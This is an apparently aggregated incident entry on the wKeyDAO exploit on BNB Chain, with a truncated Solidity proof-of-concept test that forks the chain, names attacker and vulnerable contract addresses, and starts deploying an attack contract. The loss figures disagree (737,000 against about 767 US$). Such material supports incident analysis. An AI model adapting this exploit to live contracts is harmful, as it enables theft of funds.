# [?] wKeyDAO - unprotected function

## Summary
Severity: Unknown
Chain: BNB Chain
Component: wKeyDAO
Published: 2025-03-16
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-03/wKeyDAO_exp.sol
Type: defi-exploit-poc

## Details
Lost: 737,000

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;


import "../basetest.sol";
import {IERC20, WETH} from "../interface.sol";

// @KeyInfo - Total Lost : ~767 US$
// Attacker : 0x3026c464d3bd6ef0ced0d49e80f171b58176ce32
// Attack Contract : 0x3783c91ee49a303c17c558f92bf8d6395d2f76e3
// Vulnerable Contract : 0xd511096a73292a7419a94354d4c1c73e8a3cd851
// Attack Tx : https://app.blocksec.com/explorer/tx/bsc/0xc9bccafdb0cd977556d1f88ac39bf8b455c0275ac1dd4b51d75950fb58bad4c8?line=12


// @Analysis
// Post-mortem : https://x.com/Phalcon_xyz/status/1900809936906711549
// @POC Author : [Yajin Zhou](https://x.com/yajinzhou)


// Contracts involved
address constant wKeyDaoSell = 0xD511096a73292A7419a94354d4C1C73e8a3CD851;
address constant BUSD = 0x55d398326f99059fF775485246999027B3197955;
address constant wKeyDAO = 0x194B302a4b0a79795Fb68E2ADf1B8c9eC5ff8d1F;
address constant pancakeSwapRouterV2 = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

contract wKeyDao_exp is Test {
    address attacker = makeAddr("attacker");

    function setUp() public {
        vm.createSelectFork("bsc", 47_469_060 - 1);
    }

    function testPoC() public {
        vm.startPrank(attacker);
        Attacker attc = new Attacker();
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-03/wKeyDAO_exp.sol_
